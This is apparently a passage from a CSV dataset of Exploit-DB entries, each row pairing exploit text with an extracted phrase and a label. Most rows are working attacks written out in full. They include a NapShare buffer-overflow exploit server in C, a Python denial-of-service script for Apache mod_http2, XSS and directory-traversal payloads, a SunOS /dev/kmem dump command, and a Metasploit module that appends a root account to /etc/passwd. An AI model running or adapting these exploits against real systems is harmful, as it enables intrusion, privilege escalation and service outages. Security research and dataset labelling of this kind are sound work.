(send(sock,packetbuf,strlen(packetbuf),0)==SOCKET_ERROR){         printf(""Can not send packet\n"");         return(0);     }      Sleep(1000);     closesocket(sock);     printf(""Done\n"");     return(0); }","a maliciously crafted ""Content-Type"" header to a HTTP request for a media file",1
24857,"NapShare 1.2 - Remote Buffer Overflow (2) // source: https://www.securityfocus.com/bid/11967/info   It is reported that NapShare is susceptible to a remote buffer overflow vulnerability. This is due to a failure of the application to properly bounds check user-supplied data prior to copying it to a fixed-size memory buffer.   Attackers running malicious Gnutella servers are reportedly able to exploit this vulnerability to execute arbitrary code in the context of the vulnerable application.   Version 1.2 of NapShare is reported susceptible. Other versions may also be affected.  /*  * napshare_srv_2.c  * 2004.12.10  * Bartlomiej Sieka  *  * This program generates the injection vector used to exploit a buffer  * overflow in napshare version 1.2 (file auto.c, function  * auto_filter_extern.c, buffer is ""filename""). The payload contains  * simply sh(1) commands that will be passed to the system(3) call.  *  * This program should be used with the tcpserver(1) to allow a running  * napshare client to make connections to it.  * The recipe:  * Issue the following commands:  * gcc -o napshare_srv_2 napshare_srv_2  * tcpserver 0 50000 ./napshare_srv_2 &  * napshare  *  * In the napshare program do the following:  * - Connect to peer 127.0.0.1:50000 (type the ip:port on the ""gnutellaNet""  *   screen in the text input field to the right of the ""Add"" button  *   and then click ""Add"").  * - Add new ""extern"" filter. (On the ""Automation"" screen input ""test"",  *   ""test"" and ""extern"" into ""Search"", ""Strings"" and ""Filters"" input  *   fields, respectively. Then click ""Add to list"".)  * - Start the automation function. (On the ""Automation"" screen click  *   on the ""Start Automation"" button).  * After about 20 seconds a file called ""TIOLPXE"" will be created in  * the current working directory.  */  #include<stdio.h> #include<fcntl.h> #include<arpa/inet.h> #include<assert.h> #include <sys/time.h> #include <signal.h>  #define NODEBUG  #define PING_DESCR 0x00 #define PONG_DESCR 0x01 #define PUSH_DESCR 0x40 #define QUERY_DESCR 0x80 #define QUERYHIT_DESCR 0x81  #define MAX_IV 16000 #define MAX_PAYLOAD_SIZE 16000 #define MAX_PAYLOAD_LEN 16000 #define HDR_SIZE 23 #define MSG_ID_SIZE 16  /*  * Messages used to establish a connection  */ const char * Connect = ""GNUTELLA CONNECT/""; const char * OK =  ""GNUTELLA/0.6 200 OK\r\n\ Pong-Caching: 0.1\r\n\ Accept-Encoding: deflate\r\n\ X-Locale-Pref: fr\r\n\ X-Guess: 0.1\r\n\ Content-Encoding: deflate\r\n\ X-Max-TTL: 3\r\n\ Vendor-Message: 0.1\r\n\ X-Ultrapeer-Query-Routing: 0.1\r\n\ X-Query-Routing: 0.1\r\n\ Listen-IP: 81.56.202.32:6346\r\n\ X-Ext-Probes: 0.1\r\n\ Remote-IP:.69.211.109.203\r\n\ GGEP: 0.5\r\n\ X-Dynamic-Querying: 0.1\r\n\ X-Degree: 32\r\n\ User-Agent: LameWare/9.9.7.(0xdeadbeef)\r\n\ X-Ultrapeer: True\r\n\ X-Try-Ultrapeers: 69.28.37.190.69:6348\r\n\ \r\n"";  const char * End = ""\r\n\r\n""; /* this is a stupid idea */   /* all output intened for the user should go here */ FILE * out_stream;  char Hdr[HDR_SIZE]; char Payload[MAX_PAYLOAD_SIZE]; char MsgId[MSG_ID_SIZE]; char c; uint32_t Len;   int dump_fd(int fd, unsigned count);  int parse_query_payload(int fd, unsigned payload_len, char * criteria);  void send_ping(int fd); void send_pong(int fd); void send_queryhit(int fd, char *criteria, char *descr_id);  void set_descr_hdr(char * Hdr, 	      char * msg_id, 	      char descr, 	      char ttl,  	      char hops, 	      uint32_t len);  void random_array(unsigned int n, char * array);  int write_buf(int fd, char *buf, unsigned size);  /* XXX should this really be here...? */ uint16_t port; uint32_t ip; int net_out_fd;   /* send the Ping message periodically */ void timer_send_ping(int signal){   fprintf(out_stream, ""Sending Ping message\n"");   send_ping(net_out_fd);   fflush(out_stream); }   /***************************************************************************  * main  */ int main(int argc, char * argv[]){ unsigned int seed;   int net_in_fd = 0;   char *msg;   char criteria[4096];   char c;     char buf[1024];   int num_read;   unsigned char payload_descr;   unsigned payload_len;   char payload[MAX_PAYLOAD_LEN];   char descr_id[16];   int queryhit_sent = 0;   int i;      int net_out_fd = 1;   struct itimerval itv;     /* set up the local output stream */   if((out_stream = fopen(""/dev/tty"", ""w"")) == NULL){     perror(""Can't open /dev/tty"");     /* let's use stderr instead */     out_stream = stderr;   }      if(signal(SIGALRM, timer_send_ping) == SIG_ERR){     fprintf(out_stream, ""Couldn't set the signal handler"");     exit(1);   }      itv.it_interval.tv_sec = 5;   itv.it_interval.tv_usec = 0;     itv.it_value.tv_sec = 5;   itv.it_value.tv_usec = 0;      /* that stupid client closes the connection after 15 secs */   if(setitimer(ITIMER_REAL, &itv, 0x00) == -1){     fprintf(out_stream, ""Couldn't set the signal handler"");     exit(1);   }    // make a connection with the client      // read the begining        num_read = read(net_in_fd, buf, sizeof(Connect));   if(num_read != sizeof(Connect)){     fprintf(out_stream, ""Can't read \""Connect\"" from the net\n"");     exit(1);   }      // maybe later compare what's read with ""Connect"":    if(strncpy    // now read read everything until the final ""\n\n""   num_read = read(net_in_fd, buf, strlen(End));   if(num_read != strlen(End)){     fprintf(out_stream, ""Connection closed before double \\n\n"");     exit(1);          }      while(strncmp(buf, End, strlen(End)) != 0){     fprintf(out_stream, ""%s\n"", buf);      // shift the buffer by one      for(i = 0; i < strlen(End) - 1; i++){       buf[i] = buf[i+1];     }     num_read = read(net_in_fd, &buf[strlen(End) - 1], 1);     if(num_read != 1){       fprintf(out_stream, ""Connection closed before double \\n\n"");       exit(1);     }   }     // let's connect   write(net_out_fd, OK, strlen(OK));   fprintf(out_stream, ""Connected (hopefully)\n"");    /* Now the peer will send the OK message, read it */     dump_fd(net_in_fd, strlen(""GNUTELLA/0.6 200 OK\r\n\r\n""));     while(1){     if(!read_header(net_in_fd, 		    &payload_descr, 		    &payload_len, 		    descr_id)) break;     assert(payload_len <= MAX_PAYLOAD_LEN);     switch(payload_descr){     case PING_DESCR:       /* the payload lenght should be zero */       fprintf(out_stream, ""Received a Ping message\n"");       if(payload_len != 0){ 	fprintf(out_stream, ""Payload for Ping > 0 !\n"");       }       fprintf(out_stream, ""Sending a Pong message\n"");       send_pong(net_out_fd);             break;     case PONG_DESCR:     /* show the payload */       fprintf(out_stream, ""Received a Pong message\n"");       if(!dump_fd(net_in_fd, payload_len)) break;       break;           case QUERY_DESCR:       /* parse the payload */       fprintf(out_stream, ""Received a Query message\n"");       if(!parse_query_payload(net_in_fd, payload_len, criteria)) break;       if(!queryhit_sent){ 	queryhit_sent = 1; 	fprintf(out_stream, ""Sending a QueryHit message\n""); 	send_queryhit(net_out_fd, criteria, descr_id); 	fprintf(out_stream, ""QueryHit sent\n"");       } else { 	fprintf(out_stream, ""NOT sending a QueryHit message\n"");		       }       break;     case PUSH_DESCR:       /* show the payload */       fprintf(out_stream, ""Received a Push message\n"");       if(!dump_fd(net_in_fd, payload_len)) break;       break;           }   } }/* main() ****************************************************************/   /*  *  * function definitions  *  */   /***************************************************************************  * Write a Ping message into fd  */ void send_ping(int fd){   char * msg_id;   /* get a random message id */   random_array(MSG_ID_SIZE, MsgId);   msg_id = MsgId;   Len = 0;   set_descr_hdr(Hdr, msg_id, PING_DESCR, rand() % 256, rand() % 256, Len);   write_buf(fd, Hdr, HDR_SIZE); }/* send_ping() ***********************************************************/   /***************************************************************************  * Write a Pong message into fd  */ void send_pong(int fd){   char * msg_id;   unsigned payload_len;    ip = 0x0100007f;   port = 50000;    /* get a random message id */   random_array(MSG_ID_SIZE, MsgId);   msg_id = MsgId;   Len = 14;    set_descr_hdr(Hdr, msg_id, PONG_DESCR, 5, 0, Len);   if(!write_buf(fd, Hdr, HDR_SIZE)){     fprintf(out_stream, ""send_pong(): couldn't send header\n"");   }    /*    * Payload[0]-[1]: port number    * Payload[2]-[5]: IP (little endian)    * Payload[6]-[9]: # files shared    * Payload[10]-[13]: # kilobytes shared    */    payload_len = Len;   random_array(payload_len, Payload);   memcpy(&Payload[0], &port, 2);   memcpy(&Payload[2], &ip, 4);   if(!write_buf(fd, Payload, payload_len)){     fprintf(out_stream, ""send_pong(): couldn't send payload\n"");   } }/* send_pong() ***********************************************************/   /***************************************************************************  * Write a QueryHit message into fd  * criteria: null-terminated search criteria  * descr_id: descr. of the Query msg (16 bytes)  */ void send_queryhit(int fd, char *criteria, char *descr_id){    unsigned payload_len;   char number_hits = 1;   uint16_t speed;   char servent_id[16];   char result_set[MAX_IV];   unsigned result_set_len;   ip = 0x7f000001;   port = 60000;    result_set_len = set_result_set(result_set, criteria);    assert(result_set_len <= MAX_IV);    /* size    * 1 : Payload[0]: number if hits    * 2 : Payload[1-2]: port    * 4 : Payload[3-6]: ip    * 4 : Payload[7-10]: speed kb/s    * ? : Payload[11-n-1]: result set    * 16: Payload[n-n+16] servenet it    */   payload_len = 1 + 2 + 4 + 4 + result_set_len + 16;    set_descr_hdr(Hdr, descr_id, QUERYHIT_DESCR, 5, 0, payload_len);   if(!write_buf(fd, Hdr, HDR_SIZE)){     fprintf(out_stream, ""send_pong(): couldn't send header\n"");   }    random_array(payload_len, Payload);   memcpy(&Payload[0], &number_hits, 1);   memcpy(&Payload[1], &port, 1);   memcpy(&Payload[3], &ip, 4);   memcpy(&Payload[7], &speed, 4);   memcpy(&Payload[11], result_set, result_set_len);   memcpy(&Payload[11 + result_set_len], servent_id, 16);      if(!write_buf(fd, Payload, payload_len)){     fprintf(out_stream, ""send_pong(): couldn't send payload\n"");   } }/* send_queryhit() *******************************************************/   /***************************************************************************  * Copy the parts of the Descriptor Header to the msg buffer  */ void set_descr_hdr(char * msg, 	      char *msg_id, 	      char descr, 	      char ttl,  	      char hops, 	      uint32_t len){    uint32_t len_net = htonl(len);      memcpy(msg, msg_id, MSG_ID_SIZE);   memcpy(msg + MSG_ID_SIZE, &descr, 1);   memcpy(msg + MSG_ID_SIZE + 1, &ttl, 1);   memcpy(msg + MSG_ID_SIZE + 2, &hops, 1);   /* some problems with endianess... */   /*  memcpy(msg + MSG_ID_SIZE + 3, &len_net, sizeof(uint32_t)); */   memcpy(msg + MSG_ID_SIZE + 3, &len, sizeof(uint32_t));  }/* set_descr_header() ****************************************************/   /***************************************************************************  * Create a random array of n bytes at array (assume memory is allocated)  */ void random_array(unsigned int n, char * array){   int i;   for(i = 0; i < n; i++){     *(array + i) = rand() % 256;   }  }/* random_array() *********************************************************/   /***************************************************************************  * write a buffer  */ int write_buf(int fd, char *buf, unsigned size){   int ret;  #ifdef DEBUG   int i;   fprintf(out_stream, ""write_buf(): writing %d bytes:\n"", size);   for(i = 0; i < size; i++)     fprintf(out_stream, ""%.2hhx "", buf[i]);   fprintf(out_stream, ""\n""); #endif      if((ret = write(fd, buf, size)) == -1){     perror(""write_buf(): write failed"");     return 0;   } else if(ret < size){     /* couldn't write the whole thing. hmm... */     fprintf(out_stream, ""Written only %d bytes out of %d\n"", ret, size);     return 0;   }   return 1; }/* write_buf() ***********************************************************/    int dump_fd(int fd, unsigned count){   int i;   char c;   for(i = 0; i < count; i ++){     if(read(fd, &c, 1) != 1) {perror(""Can't read""); return 0;};     fprintf(out_stream, ""%.3d: 0x%.2hhx %c\n"", i+1, c, c);   }   return 1; }     /***************************************************************************  * Reads a Gnutella hader from the given file descriptor.  * payload_descr: set to the descritor read  * payload_len: set to the lenght read  * returns 1 if there were enough bytes read, 0 otherwise  */ int read_header(int net_in_fd, 	    char * payload_descr, 	    unsigned int * payload_len, 	    char * descr_id){   int ret;   char header[23];   ret = read(net_in_fd, header, 23);   if(ret == -1){     fprintf(out_stream, ""read_header(): read() failed\n"");   }    if(ret < 23){     fprintf(out_stream, ""can't read the full header, read %d bytes\n"", ret);     return 0;   }       /* header[0]-[15] : message id, or descriptor id */   /* header[16]     : payload descriptor */   /* header[17]     : ttl */   /* header[18]     : Hops */   /* header[19]-[22]: payload lenght */   memcpy(descr_id, header, 16);    *payload_descr = header[16];    /* Gnutella 0.4 specs says that stuff is little-endian, but it lies */   /*  *payload_len = ntohl(*(uint32_t *)&header[19]); */   *payload_len = *(uint32_t*)&header[19];   fprintf(out_stream, ""Payload descr : 0x%.2hhx\n"", header[16]);   fprintf(out_stream, ""TTL           : 0x%.2hhx\n"", header[17]);   fprintf(out_stream, ""Hops          : 0x%.2hhx\n"", header[18]);   fprintf(out_stream, ""Payload len(b): 0x%.2hhx"", header[19]);   fprintf(out_stream, ""%.2hhx"", header[20]);   fprintf(out_stream, ""%.2hhx"", header[21]);   fprintf(out_stream, ""%.2hhx\n"", header[22]);   fprintf(out_stream, ""Payload len   : %d\n"", *payload_len);   return 1; }/* read_header() *********************************************************/   /***************************************************************************  * payload[0-1]: min speed in kb/sec  * payload[2-payload_len-1]: search criteria, null terminated  *  */ int parse_query_payload(int fd, unsigned payload_len, char * criteria){   int i;   char payload[MAX_IV];   if(read(fd, payload, payload_len) != payload_len) return 0;    fprintf(out_stream, ""speed %d\n"", payload[0] + 0xff * payload[1]);   if(payload[payload_len - 1] != 0x00){     fprintf(out_stream, ""parse_query_payload(): serach criteria not null\  termintaed (%.2hhx), fixing it"", payload[payload_len - 1]);     payload[payload_len - 1] = 0x00;   }   assert(payload_len > 2);   strcpy(criteria, &payload[2]);   fprintf(out_stream, ""search criteria: %s\n"", criteria);   return 1; }/* parse_query_payload() *************************************************/   /***************************************************************************  * builds the result_set for the QueryHit message. The file name  * is where the IV should go.  * result_set[0-3] : file index  * result_set[4-7] : file size in bytes  * resutl_set[8-?] : 0x0000 terminated file name  * result_set: store the result set there (mem already allocated)  * criteria: serach criteria from the Query msg - in case the peer  * would some checks to see if the file name in the QueryHit corelates  * with the criteria sent. napshare doesn't do anything like this, so  * this parameter is not used.  * returns: the size of the result set  */ int set_result_set(char *result_set, char *criteria){   char iv[MAX_IV];   char *index = ""iiii"";   char *size = ""ssss"";   char doublenull[] = {0x00, 0x00};   char *s;   char *end;   char *tmp;   int i;    s = iv;   /* we need 10736 - 4 bytes to overflow the ip */   end = s + 10736 - 8; /* -8 because we want ot preserve the saved ebp */    /* let's build the injection vector */   /* if will be stored in the filename array, &filename 0xbfbfbcb0 */    /* 0xbfbfbcb0 */   /* marker */   tmp = ""AAAABBBBCCCCDDDD"";   while(*tmp) *s++ = *tmp++;    /*    * simutale the rc and r structures on the stack - to prevent    * segmentation faults in g_snprintf() and strcpy()    */      /* 0xbfbfbcc0 - begining of the of the rc structure */   /* pointer to results_set strucure, but points to itself */   *s++ = 0xc0;   *s++ = 0xbc;    *s++ = 0xbf;   *s++ = 0xbf;       /* 0xbfbfbcc4 - anything */   *s++ = 0x01;   *s++ = 0x01;   *s++ = 0x01;   *s++ = 0x01;   /* 0xbfbfbcc8 - anything */   *s++ = 0x01;   *s++ = 0x01;   *s++ = 0x01;   *s++ = 0x01;   /* 0xbfbfbccc - begining of the r structure and rc cont'd */   /* can be anything */   *s++ = 0x01;   *s++ = 0x01;   *s++ = 0x01;   *s++ = 0x01;   /* 0xbfbfbcd0 - a string that is actually used, point to """" */   /* it just do happens that 0xbfbfe6ac has 0x00000000 */   *s++ = 0xac;   *s++ = 0xe6;   *s++ = 0xbf;   *s++ = 0xbf;    /* the payload: simply the shell commands. Note: the '\n' at */   /* is required, otherwise sh complains and fails us.         */   tmp = "";touch TIOLPXE;\n"";    /* want to put it as close to the $ebp as possible */   /* shell ""nop sled"" */    while(end - s > strlen(tmp)) *s++ = '.';      /* now output the payload */   while(*(tmp)) *(s++) = *(tmp++);      /* preserv saved ebp (0xbfbfe6b8), so we can have clean return? */   *s++ = 0xb8;   *s++ = 0xe6;   *s++ = 0xbf;   *s++ = 0xbf;    /* smasher - no need to smash the ret address, preserve it */   *s++ = 0x39;   *s++ = 0x2d;   *s++ = 0x08;   *s++ = 0x08;    /*    * Need to preserve following function call arguments to survive until    * return from the function: rc, r, string.     */    /* rc    * rc is allocated on the heap and its address varies from execution    * to execution. Let's just point it to an address on the stack that    * we control.    * 0xbfbfbc0    */   *s++ = 0xc0;   *s++ = 0xbc;   *s++ = 0xbf;   *s++ = 0xbf;    /* r    * r's address doesn't change and it's 0x8102a00 - can't send it though,    * because of the 0x00 byte. Let us use a stack location then. (Note    * that we could probably use the strcpy() to write that 0x00 byte).    * 0xbfbfbccc    */   *s++ = 0xcc;   *s++ = 0xbc;   *s++ = 0xbf;   *s++ = 0xbf;      /* string    * string (with some other strings concatenated) will be passed    * to the system(3) call. Let us then point to the stack, where we    * can easily store a shell command of out choice.    * 0xbfbfe628    */     *s++ = 0x28;   *s++ = 0xe6;   *s++ = 0xbf;   *s++ = 0xbf;      /* null-terminate for the strlen() below  to work */   *s = 0x00;    /* we have all the parts, build the result set */   memcpy(&result_set[0], index, 4);   memcpy(&result_set[4], size, 4);   memcpy(&result_set[8], iv, strlen(iv));   memcpy(&result_set[8 + strlen(iv)], doublenull, 2);    return 4 + 4 + strlen(iv) + 2; }/* set_result_set() ******************************************************/",Write a Ping message,1
26919,AbleDesign D-Man 3.0 - 'Title' Cross-Site Scripting source: https://www.securityfocus.com/bid/15993/info  D-Man is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input to the 'title' parameter.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site.   http://www.example.com/index.php?go=admin&do=do_search&du=usergroup&title=[code]&search=single,malicious PHP code,1
40909,"Apache 2.4.23 mod_http2 - Denial of Service #!/usr/bin/python  """""" source : http://seclists.org/bugtraq/2016/Dec/3 The mod_http2 module in the Apache HTTP Server 2.4.17 through 2.4.23, when the Protocols configuration includes h2 or h2c, does not restrict request-header length, which allows remote attackers to cause a denial of service (memory consumption) via crafted CONTINUATION frames in an HTTP/2 request.(https://access.redhat.com/security/cve/cve-2016-8740)  Usage : cve-2016-8740.py [HOST] [PORT] """"""  import sys import struct import socket  HOST = sys.argv[1] PORT = int(sys.argv[2])  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT))  # https://http2.github.io/http2-spec/#ConnectionHeader s.sendall('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')  # https://http2.github.io/http2-spec/#SETTINGS SETTINGS = struct.pack('3B', 0x00, 0x00, 0x00) # Length SETTINGS += struct.pack('B', 0x04) # Type SETTINGS += struct.pack('B', 0x00) SETTINGS += struct.pack('>I', 0x00000000) s.sendall(SETTINGS)  # https://http2.github.io/http2-spec/#HEADERS HEADER_BLOCK_FRAME = '\x82\x84\x86\x41\x86\xa0\xe4\x1d\x13\x9d\x09\x7a\x88\x25\xb6\x50\xc3\xab\xb6\x15\xc1\x53\x03\x2a\x2f\x2a\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76' HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:] # Length HEADERS += struct.pack('B', 0x01) # Type HEADERS += struct.pack('B', 0x00) # Flags HEADERS += struct.pack('>I', 0x00000001) # Stream ID s.sendall(HEADERS + HEADER_BLOCK_FRAME)  # Sending CONTINUATION frames for leaking memory # https://http2.github.io/http2-spec/#CONTINUATION while True:     HEADER_BLOCK_FRAME = '\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'     HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:] # Length     HEADERS += struct.pack('B', 0x09) # Type     HEADERS += struct.pack('B', 0x01) # Flags     HEADERS += struct.pack('>I', 0x00000001) # Stream ID     s.sendall(HEADERS + HEADER_BLOCK_FRAME)",crafted CONTINUATION frames in an HTTP/2 request,1
15437,"Quick Tftp Server Pro 2.1 - Directory Traversal #     _             ____  __            __    ___  #    (_)____ _   __/ __ \/ /_____  ____/ /  _/_/ | #   / // __ \ | / / / / / //_/ _ \/ __  /  / / / / #  / // / / / |/ / /_/ / ,< /  __/ /_/ /  / / / /  # /_//_/ /_/|___/\____/_/|_|\___/\__,_/  / /_/_/   #                   Live by the byte     |_/_/   # # Members: # # Pr0T3cT10n # -=M.o.B.=- # TheLeader # Sro # Debug # # Contact: inv0ked.israel@gmail.com # # ----------------------------------- # Quick Tftp Server Pro is vulnerable for a path traversal, the following will explain you how to read & write files # The vulnerability allows an unprivileged attacker to read & write files whom he has no permissions to. # The vulnerable FTP command are: # * GET 	- Read 	File # * PUT 	- Write File #----------------------------------- # Vulnerability Title: Quick Tftp Server Pro v2.1 Remote Directory Traversal Vulnerability # Date: 05/11/2010 # Author: Pr0T3cT10n # Software Link: http://www.tallsoft.com/tftpserver_setup.exe # Affected Version: 2.1 # Tested on Windows XP Hebrew, Service Pack 3 # ISRAEL, NULLBYTE.ORG.IL ### Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp.  C:\Documents and Settings\Admin>tftp  Transfers files to and from a remote computer running the TFTP service.  TFTP [-i] host [GET | PUT] source [destination]    -i              Specifies binary image transfer mode (also called                   octet). In binary image mode the file is moved                   literally, byte by byte. Use this mode when                   transferring binary files.   host            Specifies the local or remote host.   GET             Transfers the file destination on the remote host to                   the file source on the local host.   PUT             Transfers the file source on the local host to                   the file destination on the remote host.   source          Specifies the file to transfer.   destination     Specifies where to transfer the file.   C:\Documents and Settings\Admin>tftp -i 127.0.0.1 GET ../../boot.ini C:\boot.txt  Transfer successful: 206 bytes in 1 second, 206 bytes/s  C:\Documents and Settings\Admin>type c:\boot.txt [boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=""Microsoft Windows XP Professional"" /noexecute=optin /fastdetect  C:\Documents and Settings\Admin>",read & write files whom he has no permissions to,1
18185,"Muster Render Farm Management System - Arbitrary File Download #Name: Muster Render Farm Management System Arbitrary File Download  #Vendor Website : http://www.vvertex.com/muster.html  #Date Released : November 29, 2011  #Affected Software : Muster < 6.20  #Researcher : Nick Freeman (nick.freeman@security-assessment.com)  #Description #Security-Assessment.com has discovered a vulnerability with the Muster 6.1.6 web management server. This issue #can be exploited by an unauthenticated user to gain full control of the web management interface, and to send #arbitrary commands to all Muster clients.  #Exploitation #It is possible to download any file on the Muster server by exploiting a vulnerability in the web server. By #using directory traversal characters (\..\..\) in the URL, it is possible to specify any file on the file #system to be served to the client. Exploitation of this vulnerability does not require authentication. The #table below includes an example HTTP Request that would allow the download of the “muster.db” SQLite database:  #Example of Malicious HTTP Request :  GET /a\..\..\muster.db  HTTP/1.1 Host: musterserver:8690     #This SQLite database contains a table with all users of the application together with base64-encoded #passwords. By retrieving this database or other similar configuration files, it is possible to gain #administrative access over the render farm.   #Solution #A patch is available from the vendor’s website. Version 6.20 remediates this vulnerability.",exploiting a vulnerability in the web server,1
19232,"SunOS 4.1.4 - arp(8c) Memory Dump source: https://www.securityfocus.com/bid/291/info  The version of arp(8c) which shipped with versions of SunOs 4.1.X could be used to dump system memory by using the -f flag. This flag causes the file filename to be read and multiple entries to be set in the ARP tables. However, in this instance because of poor permission sets on /dev/kmem a user can specify the file to be read as /dev/kmem and therefore gain a dump of currently paged system memory. This could lead to a root compromise.    $ arp -f /dev/kmem | strings > mem",using the -f flag,1
42784,"Apple iOS 10.2 - Broadcom Out-of-Bounds Write when Handling 802.11k Neighbor Report Response Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1289  The exploit gains code execution on the Wi-Fi firmware on the iPhone 7.  The exploit has been tested against the Wi-Fi firmware as present on iOS 10.2 (14C92), but should work on all versions of iOS up to 10.3.3 (included). However, some symbols might need to be adjusted for different versions of iOS, see ""exploit/symbols.py"" for more information.  Upon successful execution of the exploit, a backdoor is inserted into the firmware, allowing remote read/write commands to be issued to the firmware via crafted action frames (thus allowing easy remote control over the Wi-Fi chip).   The attached archive contains the following directories:   -hostapd-2.6 - A modified version of hostapd utilised in the exploit. This version of hostapd is configured to                  support 802.11k RRM, and in particular Neighbor Reports. Moreover, this version of hostapd is                  instrumented to add various commands, allowing injection and reception of crafted action frames                  used throughout the exploit.   -exploit     - The exploit itself.  To run the exploit, you must execute the following steps:   -Connect (and enable) a SoftMAC Wi-Fi dongle to your machine (such as the TL-WN722N)   -Compile the provided version of hostapd   -Modify the ""interface"" setting under ""hostapd-2.6/hostapd/hostapd.conf"" to match your interface's name   -Configure the following settings under ""exploit/conf.py"":     -HOSTAPD_DIR - The directory of the hostapd binary compiled above     -TARGET_MAC  - The MAC address of the device being exploited     -AP_MAC      - The MAC address of your wireless dongle     -INTERFACE   - The name of the wireless dongle's interface   -Assemble the backdoor shellcode by running ""exploit/assemble_backdoor.sh""   -Run hostapd with the configuration file provided above, broadcasting a Wi-Fi network (""test80211k"")   -Connect the target device to the network   -Run ""exploit/attack.py""  Following the steps above should result in installation of a simple backdoor allowing read/write access to the firmware. You can interact with the backdoor to gain R/W access to the firmware by calling the ""read_dword"" and ""write_dword"" functions, respectively.   Proof of Concept:   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42784.zip",crafted action frames,1
21927,"Metasploit < 4.4 - pcap_log Plugin Privilege Escalation (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core' require 'rex' require 'msf/core/post/common' require 'msf/core/post/file' require 'msf/core/post/linux/priv' require 'msf/core/exploit/local/linux_kernel' require 'msf/core/exploit/local/linux' require 'msf/core/exploit/local/unix'  load 'lib/msf/core/post/common.rb' load 'lib/msf/core/post/file.rb' load 'lib/msf/core/exploit/local/unix.rb' load 'lib/msf/core/exploit/local/linux.rb'  class Metasploit3 < Msf::Post 	Rank = ExcellentRanking  	include Msf::Post::File 	include Msf::Post::Common  	include Msf::Exploit::Local::Linux 	include Msf::Exploit::Local::Unix  	def initialize(info={}) 		super( update_info( info, { 				'Name'	  => 'Metasploit pcap_log Local Privilege Escalation', 				'Description'   => %q{ 					Metasploit < 4.4 contains a vulnerable 'pcap_log' plugin which, when used with the default settings, 					creates pcap files in /tmp with predictable file names. This exploits this by hard-linking these 					filenames to /etc/passwd, then sending a packet with a priviliged user entry contained within. 					This, and all the other packets, are appended to /etc/passwd.  					Successful exploitation results in the creation of a new superuser account.  					This module requires manual clean-up - remove /tmp/msf3-session*pcap files and truncate /etc/passwd. 				}, 				'License'       => MSF_LICENSE, 				'Author'	=> [ '0a29406d9794e4f9b30b3c5d6702c708'], 				'Platform'      => [ 'linux','unix','bsd' ], 				'SessionTypes'  => [ 'shell', 'meterpreter' ], 				'References'    => 					[ 						[ 'BID', '54472' ], 						[ 'URL', 'http://0a29.blogspot.com/2012/07/0a29-12-2-metasploit-pcaplog-plugin.html'],  						[ 'URL', 'https://community.rapid7.com/docs/DOC-1946' ], 					], 				'DisclosureDate' => ""Jul 16 2012"", 				'Targets'       => 					[ 						[ 'Linux/Unix Universal', {} ], 					], 				'DefaultTarget' => 0, 			} 			)) 			register_options( 			[	 				Opt::RPORT(2940), 				OptString.new(""USERNAME"", [ true, ""Username for the new superuser"", ""metasploit"" ]), 				OptString.new(""PASSWORD"", [ true, ""Password for the new superuser"", ""metasploit"" ]) 			], self) 	end  	def run 		print_status ""Waiting for victim"" 		initial_size = cmd_exec(""cat /etc/passwd | wc -l"") 		i = 60 		while(true) do 			if (i == 60) 				# 0a2940: cmd_exec is slow, so send 1 command to do all the links 				cmd_exec(""for i in $(seq 0 120); do ln /etc/passwd /tmp/msf3-session_`date --date=\""\$i seconds\"" +%Y-%m-%d_%H-%M-%S`.pcap ; done"") 				i = 0 			end 			i = i+1 			if (cmd_exec(""cat /etc/passwd | wc -l"") != initial_size) 				# PCAP is flowing 				pkt = ""\n\n"" + datastore['USERNAME'] + "":"" + datastore['PASSWORD'].crypt(""0a"") + "":0:0:Metasploit Root Account:/tmp:/bin/bash\n\n"" 				print_status(""Sending file contents payload to #{session.session_host}"") 				udpsock = Rex::Socket::Udp.create( 				{ 					'Context' => {'Msf' => framework, 'MsfExploit'=>self} 				}) 				udpsock.sendto(pkt, session.session_host, datastore['RPORT']) 				break 			end 			sleep(1) 		end  		if cmd_exec(""(grep Metasploit /etc/passwd > /dev/null && echo true) || echo false"").include?(""true"")  			print_good(""Success. You should now be able to login or su to the 'metasploit' user with password 'metasploit'."") 		else 			print_error(""Failed. You should manually verify the 'metasploit' user has not been added"")	 		end  		# 0a2940: Initially the plan was to have this post module switch user, upload & execute a new payload 		#	  However beceause the session is not a terminal, su will not always allow this.		 	end end",creates pcap files in /tmp with predictable file names,1
26036,"PNG Counter 1.0 - 'Demo.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/14392/info  PNG Counter is prone to a cross-site scripting vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied URI input that will be output in dynamically generated Web pages.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. The attacker would need to entice the unsuspecting user to follow a malicious link containing script code embedded in the affected parameter. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  PNG Counter 1.0 is vulnerable to this issue.   http://www.example.com/path/demo.php?digit="">XSS",follow a malicious link containing script code embedded in the affected parameter,1
